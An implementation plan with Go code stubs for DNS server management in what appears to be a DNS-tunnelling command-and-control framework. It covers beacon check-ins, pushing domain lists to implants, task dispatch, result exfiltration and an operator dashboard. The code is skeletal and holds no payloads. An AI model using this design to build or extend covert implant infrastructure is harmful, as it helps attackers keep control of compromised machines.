# DNS Server Management Feature Implementation Plan

## Overview
Implement automatic DNS server discovery, management, and beacon domain synchronization.

## Current Status
### Completed
- ✅ beacon_dns_contacts table added to Master database
- ✅ Database methods: RecordBeaconDNSContact(), GetBeaconDNSContacts(), GetDNSServerBeacons()
- ✅ Removed response caching from DNS servers
- ✅ Fixed domains_updated handling to clear beacon.CurrentTask

### In Progress
- 🔄 DNS server registry and auto-registration

## Implementation Tasks

### 1. DNS Server Auto-Registration
**Location**: `Server/master_client.go`, `Master/api.go`

#### Server Side (`Server/master_client.go`)
Add new method to register DNS server with Master on startup:
```go
func (mc *MasterClient) RegisterServer(domain string) error {
    req := DNSServerRegistrationRequest{
        ServerID: mc.serverID,
        Domain:   domain,
        APIKey:   mc.apiKey,
    }
    // POST to /api/dns-server/register
}
```

Call from `Server/main.go` on startup after Master client initialization.

#### Master Side (`Master/api.go`)
Add endpoint handler:
```go
func (api *APIServer) handleDNSServerRegistration(w http.ResponseWriter, r *http.Request) {
    // Validate API key
    // Call db.RegisterDNSServer() or db.UpdateDNSServerHeartbeat()
    // Return list of all active DNS domains
}
```

Add route in SetupRoutes():
```go
router.HandleFunc("/api/dns-server/register", api.handleDNSServerRegistration).Methods("POST")
```

### 2. Master Tracks Beacon DNS Contacts
**Location**: `Master/api.go` - existing `/api/dns-server/beacon` endpoint

#### Update handleBeaconReport()
After calling `db.UpsertBeacon()`, add:
```go
// Record that this beacon contacted this DNS server
if err := db.RecordBeaconDNSContact(beaconID, dnsServerID, dnsDomain); err != nil {
    // Log warning but don't fail the request
}
```

### 3. DNS Server Domain List Sync
**Location**: `Server/master_client.go`, `Server/c2_manager.go`

#### Periodic Domain List Sync
Add to `Server/master_client.go`:
```go
func (mc *MasterClient) GetActiveDomains() ([]string, error) {
    // GET /api/dns-server/domains?dns_server_id=X&api_key=Y
    // Returns JSON array of all active DNS domains
}

func (mc *MasterClient) StartDomainSync(interval time.Duration, handler func([]string)) {
    // Periodically fetch domain list from Master
    // Call handler with updated list
}
```

Add to `Server/main.go`:
```go
masterClient.StartDomainSync(5*time.Minute, func(domains []string) {
    c2.UpdateKnownDomains(domains)
})
```

### 4. First Check-In Domain List Response
**Location**: `Server/c2_manager.go`

#### Modify handleCheckin()
```go
func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate bool) string {
    // ... existing checkin logic ...
    
    // Check if this is the beacon's first check-in
    isNewBeacon := !exists
    
    // ... existing task check logic ...
    
    // If new beacon and no task, send domain list
    if isNewBeacon && response == "NONE" {
        domains := c2.GetAllDomains() // Get from Master sync or config
        domainList := strings.Join(domains, ",")
        return fmt.Sprintf("DOMAINS|%s", domainList)
    }
    
    return response
}
```

### 5. Client Handles DOMAINS Response
**Location**: `Client/main.go`

#### Update runBeacon()
```go
// Send check-in
response, err := b.checkIn()
if err != nil {
    continue
}

// Check for DOMAINS response (first check-in)
if strings.HasPrefix(response, "DOMAINS|") {
    domainList := response[8:] // Skip "DOMAINS|"
    domains := strings.Split(domainList, ",")
    
    // Update domain list
    b.client.mutex.Lock()
    b.client.config.DNSDomains = domains
    b.client.domainIndex = 0
    b.client.mutex.Unlock()
    
    continue // Go back to sleep and check in again
}

// Check for tasks
taskID, command, isTask := b.parseTask(response)
// ... rest of existing logic ...
```

### 6. Master UI for DNS Server Management
**Location**: `Master/web/` (new page)

#### Create dns_servers.html
- List all registered DNS servers
- Show server status (online/offline based on heartbeat)
- Show beacon count per server
- Add new DNS server (manual registration)
- Remove DNS server (with cascade to beacons)

#### Add to Master/api.go
```go
// operatorRouter routes
operatorRouter.HandleFunc("/dns-servers", api.handleListDNSServers).Methods("GET")
operatorRouter.HandleFunc("/dns-servers/{id}", api.handleGetDNSServer).Methods("GET")
operatorRouter.HandleFunc("/dns-servers", api.handleAddDNSServer).Methods("POST")
operatorRouter.HandleFunc("/dns-servers/{id}", api.handleRemoveDNSServer).Methods("DELETE")
operatorRouter.HandleFunc("/dns-servers/{id}/beacons", api.handleGetDNSServerBeacons).Methods("GET")
```

#### handleAddDNSServer()
```go
// Generate new API key
// Insert into dns_servers table
// Create update_domains task for ALL beacons to add this domain
```

#### handleRemoveDNSServer()
```go
// Mark DNS server as inactive
// Create remove_domain task for ALL beacons
// Audit log the removal
```

### 7. Domain Removal Propagation
**Location**: `Master/api.go`, `Client/main.go`

#### Master Side
When DNS server removed:
```go
// Get all active beacons
beacons := db.GetActiveBeacons(60) // Last 60 minutes

// Create remove_domain task for each
for _, beacon := range beacons {
    taskID := generateTaskID()
    command := fmt.Sprintf("remove_domain:%s", removedDomain)
    db.CreateTask(taskID, beacon.ID, command, remainingDNSServerID, operatorID)
}
```

#### Client Side
Add to beacon's task handling:
```go
if strings.HasPrefix(command, "remove_domain:") {
    domainToRemove := command[14:] // Skip "remove_domain:"
    
    b.client.mutex.Lock()
    // Filter out the removed domain
    var updatedDomains []string
    for _, domain := range b.client.config.DNSDomains {
        if domain != domainToRemove {
            updatedDomains = append(updatedDomains, domain)
        }
    }
    b.client.config.DNSDomains = updatedDomains
    b.client.mutex.Unlock()
    
    // Send acknowledgment
    _ = b.exfiltrateResult("domain_removed", taskID)
    continue
}
```

### 8. Beacon DNS Contact History in Dashboard
**Location**: `Master/web/beacon.html`, `Master/api.go`

#### Update handleGetBeacon()
```go
// ... existing beacon data ...

// Get DNS contact history
dnsContacts, err := db.GetBeaconDNSContacts(beaconID)
if err == nil {
    beaconData["dns_contacts"] = dnsContacts
}
```

#### Update beacon.html
Add section showing:
- DNS servers this beacon has contacted
- Last contact time for each
- Contact count
- Server status (active/inactive)

## Database Migrations Needed

None - schema already includes beacon_dns_contacts table.

## Testing Plan

1. **Test auto-registration**: Start new DNS server, verify it registers with Master
2. **Test first check-in**: New beacon should receive DOMAINS response
3. **Test domain addition**: Add DNS server via UI, verify beacons receive update_domains task
4. **Test domain removal**: Remove DNS server, verify beacons receive remove_domain task
5. **Test contact tracking**: Verify beacon_dns_contacts table populates correctly
6. **Test dashboard**: Verify beacon detail page shows DNS contact history

## Priority Order

1. **High**: DNS server auto-registration and heartbeat
2. **High**: First check-in domain list response
3. **High**: Client DOMAINS response handling
4. **Medium**: Master UI for DNS server management
5. **Medium**: Domain removal propagation
6. **Low**: Beacon DNS contact history display

## Next Steps

Focus on getting the current client/server changes working first:
1. Compile client and server with current changes
2. Test domains_updated acknowledgment flow
3. Verify beacon can check in to new DNS server after domain update
4. Then proceed with auto-discovery features

